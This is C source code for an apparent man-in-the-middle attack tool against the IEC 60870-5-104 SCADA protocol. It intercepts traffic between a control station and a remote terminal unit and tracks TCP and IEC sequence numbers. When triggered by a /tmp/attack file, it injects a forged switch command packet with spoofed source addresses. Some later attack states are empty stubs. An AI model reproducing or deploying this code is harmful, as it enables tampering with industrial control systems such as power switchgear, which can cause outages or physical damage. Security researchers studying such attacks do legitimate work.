#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>
#include <fcntl.h>

extern int errno;

#include "templates_switch_toggle.h"


#define RESET   "\033[0m"
#define RED     "\033[31m"      /* Red */
#define GREEN   "\033[32m"      /* Green */

#define DEBUG_IEC104 1

#define P104_OFFSET 54
#define INPAYOFF_APDULEN 1
#define INPAYOFF_SUtype 2
#define INPAYOFF_RX 2
#define INPAYOFF_TX 4
#define INPAYOFF_TYPE 7
#define INPAYOFF_IDFIELD 8
#define INPAYOFF_OA 10
#define INPAYOFF_ADDR 11
#define INPAYOFF_IOA 13

static const unsigned char template_ieac104[70] = {
  0x00, 0xa0, 0x45, 0xb1, 0xb4, 0x80, //dmac
  0x00, 0xe0, 0xa8, 0xb0, 0x58, 0xc4, //smac
  0x08, 0x00,                         //ipv4
  0x45,                               //v + iph len
  0x00, 0x00, 0x38, 0x2c, 0x86, 0x00, 0x00, 0x3c, 0x06, // ip head
  0x36, 0xf1, // ip chksum
  0x0a, 0x82, 0xff, 0x65, //ip src
  0x0a, 0x7f, 0x06, 0xe3, //ip dst
  
  0x09, 0x64, //sport
  0xfe, 0x04, //dport
  
  0x70, 0xc4, 0x9c, 0x06, // seq
  0x69, 0x55, 0x6f, 0xa2, // ack

  0x50, 0x18, 0x20, 0x00,

  0x65, 0x4c, // tcp head chk

  0x00, 0x00,

  /// IEC 104 NOW
  0x68, 0x0e, 0x4c, 0x00, 0x0a, 0x00,
  0x2e, 0x01, 0x07, 0x60, 0x2c, 0x03,
  0x01, 0x03, 0x01, 0x85
};


typedef struct {
  unsigned char  pkttype; 
  unsigned char  apdulen;
  // unsigned char  SUtype;
  unsigned short tx;
  unsigned short rx;
  unsigned char  type;
  unsigned char  idfield;
  unsigned char  oa;
  unsigned short addr;
} __attribute__((packed)) header_104_t;



enum Attackstatemachine {
  STATE_IDLE,
  STATE_START,
  STATE_SELECT,
  STATE_ANSWER_SELECT,
  STATE_EXEC,
  STATE_ANSWER_EXEC,
  STATE_BLOCKREPORT,
  STATE_FINISH,
  
};

int sendmsg(int msgsz,char *msg){
  fcntl(STDOUT_FILENO, F_SETPIPE_SZ, 4);
  write(STDOUT_FILENO,&msgsz,4);
  fsync(STDOUT_FILENO);
  fcntl(STDOUT_FILENO, F_SETPIPE_SZ, msgsz);
  write(STDOUT_FILENO,msg,msgsz);
  fsync(STDOUT_FILENO);
}

int main(int argc,char** argv){
  unsigned int msgsz;
  char * msg=NULL;
  int msg_alloc_sz=0;
  int r;
  FILE *f;
  enum Attackstatemachine ATK_FSM = STATE_IDLE;
  int flags = fcntl(STDIN_FILENO, F_GETFL, 0);
  fcntl(STDIN_FILENO, F_SETFL, flags & ~O_NONBLOCK);
  flags = fcntl(STDOUT_FILENO, F_GETFL, 0);
  fcntl(STDOUT_FILENO, F_SETFL, flags & ~O_NONBLOCK);
  header_104_t oldhead;
  header_104_t * newhead;
  unsigned int participants_ip[2];
  unsigned char * participants_macs[2];

  unsigned int participants_seq_orig[2];
  unsigned int participants_seq_mitm[2];
  unsigned short rxtx[2]; // in the p0 -> p1 direction
  int deltas_tcpseq[2]; // how far is the MITMed tcp seq
  int deltas_iecseq[2]; // how far is the MITMed iec seq
  char suppress = 0;
  int go_fsm;
  short asdu_addr;
  short asdu_addr_ided=0;
  char rtu_participantid,rtu_participantided;
  participants_ip[0]=0;
  participants_ip[1]=0;
  participants_macs[0]=(char*)calloc(6,sizeof(char));
  participants_macs[1]=(char*)calloc(6,sizeof(char));
  rtu_participantid=0;
  rtu_participantided=0;
  while(1){
    r=read(STDIN_FILENO,&msgsz,4);
    if(r==0)
      exit(0);
    if(r!=4){
      perror("R=");
    }else{
#ifdef DEBUG_IEC104 
      fprintf(stderr,"\n%s MSz:%d\n",argv[0],msgsz);
#endif
      fsync(STDERR_FILENO);
      if(msgsz>msg_alloc_sz){
        msg = (char*)realloc(msg,msgsz);
        msg_alloc_sz=msgsz;
      }else{
        memset(msg,0,msgsz+1);
      }
      newhead=(header_104_t*)(msg+P104_OFFSET);
      read(STDIN_FILENO,msg,msgsz);

#ifdef DEBUG_IEC104
      if(  (rtu_participantided & asdu_addr_ided ) == 0)
	if(newhead->pkttype==0x68){
	  fprintf(stderr,"pkttype:\t\t0x%x\n",newhead->pkttype);
	  fprintf(stderr,"apdulen:\t\t0x%x %d\n",newhead->apdulen,newhead->apdulen);
	  //    fprintf(stderr,"SUType: \t\t0x%x\n",newhead->SUtype);
	  fprintf(stderr,"tx:     \t\t  %d (0x%04x)\n",newhead->tx,newhead->tx);
	  fprintf(stderr,"rx:     \t\t  %d (0x%04x)\n",newhead->rx,newhead->rx);
	  fprintf(stderr,"type:   \t\t0x%x\n",newhead->type);
	  fprintf(stderr,"idfield:\t\t0x%x\n",newhead->idfield);
	  fprintf(stderr,"oa:     \t\t0x%x\n",newhead->oa);
	  fprintf(stderr,"addr:   \t\t0x%x\n",newhead->addr);
	}     
#endif
      
      // do stuff here
      
     
      
      if(participants_ip[0]==0){
	// initial pass
	participants_ip[0] = *(int*)(msg+26);
	participants_ip[1] = *(int*)(msg+30);
	memcpy(participants_macs[0],(msg+6),6);
	memcpy(participants_macs[1],(msg),6);
	
	participants_seq_orig[0] = participants_seq_mitm[0] = *(int*)(msg+38);
	participants_seq_orig[1] = participants_seq_mitm[1] = *(int*)(msg+42);

	

	fprintf(stderr,"IP1 0x%08X %d.%d.%d.%d mac %02x:%02x:%02x:%02x:%02x:%02x\n",
		participants_ip[0],
		(participants_ip[0]& 0xff),
		(participants_ip[0]& 0xff00)>>8,
		(participants_ip[0]& 0xff0000)>>16,
		(participants_ip[0]& 0xff000000)>>24,
		participants_macs[0][0],	participants_macs[0][1],
		participants_macs[0][2],	participants_macs[0][3],
		participants_macs[0][4],	participants_macs[0][5]
		
		);
	fprintf(stderr,"IP2 0x%08X %d.%d.%d.%d mac %02x:%02x:%02x:%02x:%02x:%02x\n",
		participants_ip[1],
		(participants_ip[1]& 0xff),
		(participants_ip[1]& 0xff00)>>8,
		(participants_ip[1]& 0xff0000)>>16,
		(participants_ip[1]& 0xff000000)>>24,
		participants_macs[1][0],	participants_macs[1][1],
		participants_macs[1][2],	participants_macs[1][3],
		participants_macs[1][4],	participants_macs[1][5]
		);
      }

      printf("nhtx %04x\n",newhead->tx);
      if(rtu_participantided &&  (newhead->apdulen > 4) ){
	if(
	   (participants_ip[rtu_participantid] == *(int*)(msg+30)) 
	   ){ // O is dst
	  rxtx[rtu_participantid]      = (*(short*)(msg+P104_OFFSET+INPAYOFF_RX))>>1 ;
	  rxtx[(~rtu_participantid)&1] = (*(short*)(msg+P104_OFFSET+INPAYOFF_TX))>>1 ;
	  if(ATK_FSM == STATE_IDLE){
	    participants_seq_orig[rtu_participantid] = (*(unsigned int*)(msg+0x26));
	    participants_seq_orig[(~rtu_participantid)&1] = (*(unsigned int*)(msg+0x2a));
	  }
	  
	}else{
	  rxtx[(~rtu_participantid)&1] = (*(short*)(msg+P104_OFFSET+INPAYOFF_RX))>>1 ;
	  rxtx[rtu_participantid] = (*(short*)(msg+P104_OFFSET+INPAYOFF_TX))>>1 ;
	  if(ATK_FSM == STATE_IDLE){
	    participants_seq_orig[(~rtu_participantid)&1] = (*(unsigned int*)(msg+0x26));
	    participants_seq_orig[rtu_participantid] = (*(unsigned int*)(msg+0x2a));
	  }

	  
	}
	fprintf(stderr,GREEN"RX : "RESET"0x%x (%d) "GREEN" TX :"RESET"0x%x (%d)\n",rxtx[rtu_participantid],rxtx[rtu_participantid],rxtx[(~rtu_participantid)&1],rxtx[(~rtu_participantid)&1]);
      }

      
      if(!rtu_participantided){
	if( (newhead->apdulen == 4) && (newhead->tx && 0x3) == 1){
	  //start, source is fep
	  if(participants_ip[0] == *(int*)(msg+30) ){ // part1 is rtu
	    rtu_participantid=0;
	  
	  }else{
	    rtu_participantid=1;
	  }
	  rtu_participantided=1;
	  fprintf(stderr,GREEN"HAMMER\nRTU IDed : "RESET"%d\n",rtu_participantid);
	}
      }

      if(asdu_addr_ided==0){
	if( (newhead->pkttype == 0x68) &&
	    (newhead->apdulen > 0x4) &&
	    (newhead->addr != 0) ){
	  asdu_addr=newhead->addr;
	  asdu_addr_ided=1;
	  fprintf(stderr,GREEN"HAMMER\nASDU IDed : "RESET"0x%x(%d)\n",asdu_addr,asdu_addr);
	}
      }
      if(  (rtu_participantided && asdu_addr_ided &&  (ATK_FSM==STATE_IDLE ) )){
	fprintf(stderr,RED"HAMMER\nASDU IDed : "RESET" Got the info: lock & load\n",asdu_addr,asdu_addr);
      }
      // modify stream packets here


      //////////////////////////////////////////
      // until here
      if(!suppress){
	sendmsg(msgsz,msg);
      }
      msgsz=0;
      //////////////////////////////////////////

      // inject new content in the stream here
      
      go_fsm = (rtu_participantided && asdu_addr_ided );

      while(go_fsm){
	switch(ATK_FSM){ //he boiled for our sins...


	case STATE_IDLE:
	  go_fsm=0;
	  f = fopen("/tmp/attack", "rb");
	  if(f!=NULL){
	    fprintf(stderr,"Attack !!\n");
	    fclose(f);
	    unlink("/tmp/attack");
	    ATK_FSM=STATE_START;
	  }
	  break;
	
	case STATE_START:
	  if(rtu_participantided && asdu_addr_ided){
	    msgsz=pkt_switch_init_sz;
	    if(msgsz>msg_alloc_sz){
	      msg = (char*)realloc(msg,msgsz);
	      msg_alloc_sz=msgsz;
	    }else{
	      memset(msg,0,msgsz+1);
	    }
	    newhead=(header_104_t*)(msg+P104_OFFSET);
	    memcpy(msg,pkt_switch_init,pkt_switch_init_sz);
	    // update source ip
	    memcpy(msg+30,&participants_ip[rtu_participantid],4);
	    //update dest ip
	    memcpy(msg+26,&participants_ip[(~rtu_participantid)&1],4);
	    // update tx
	    //	    short tmp_tx_rtu = (rxtx[rtu_participantid]+1) << 1 ;
	    short tmp_tx_fep = ((rxtx[~(rtu_participantid)&1]+1) << 1) | 1;
	    
	    //	    *(short*)(msg+P104_OFFSET+INPAYOFF_SUtype)= 0x0100;
	    *(short*)(msg+P104_OFFSET+INPAYOFF_TX) =  tmp_tx_fep;
	    // yeah in this type TX 
	    

	    
	    sendmsg(msgsz,msg);
	    go_fsm=0;
	  }else{
	    go_fsm=0;
	  }

	  break;
	case STATE_SELECT:

	  break;
	case STATE_ANSWER_SELECT:

	  break;
	case STATE_EXEC:

	  break;
	case STATE_ANSWER_EXEC:

	  break;
	}

      }
      msgsz=0;
    }
  }
}
